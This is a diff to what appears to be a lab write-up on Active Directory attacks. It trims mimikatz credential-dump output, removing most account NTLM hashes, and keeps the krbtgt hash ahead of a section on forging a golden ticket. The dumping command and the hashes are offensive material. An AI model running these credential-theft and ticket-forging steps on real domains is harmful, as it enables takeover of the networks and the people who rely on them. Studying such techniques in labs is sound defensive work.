@@ -745,90 +745,14 @@ Privilege '20' OK
 mimikatz # lsadump::lsa /patch
 Domain : LAB / S-1-5-21-1470288461-3401294743-676794760
 
-RID  : 000001f4 (500)
-User : Administrator
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 000001f5 (501)
-User : Guest
-LM   :
-NTLM :
+⋮
 
 RID  : 000001f6 (502)
 User : krbtgt
 LM   :
 NTLM : 3ac4cccaca955597db0d11a7ffa50025
 
-RID  : 000001f7 (503)
-User : DefaultAccount
-LM   :
-NTLM :
-
-RID  : 0000044f (1103)
-User : bindaccount
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000450 (1104)
-User : domainadmin
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000451 (1105)
-User : mike
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000452 (1106)
-User : cindy
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000453 (1107)
-User : john
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000454 (1108)
-User : paul
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000455 (1109)
-User : mssqlsvcacct
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000456 (1110)
-User : mssqlsysadm
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000457 (1111)
-User : itmanager
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 00000458 (1112)
-User : itadmin
-LM   :
-NTLM : e19ccf75ee54e06b06a5907af13cef42
-
-RID  : 000003e8 (1000)
-User : DC$
-LM   :
-NTLM : 8865ea60bb34d0b1b2984e609bebbfb5
-
-RID  : 0000045b (1115)
-User : SVR$
-LM   :
-NTLM : e629246410c5795d27b1f16b221cf083
-
-RID  : 0000045c (1116)
-User : CLIENT$
-LM   :
-NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
+⋮
 ```
 
 ## 4.2. Create golden ticket using information retrieved from domain controller
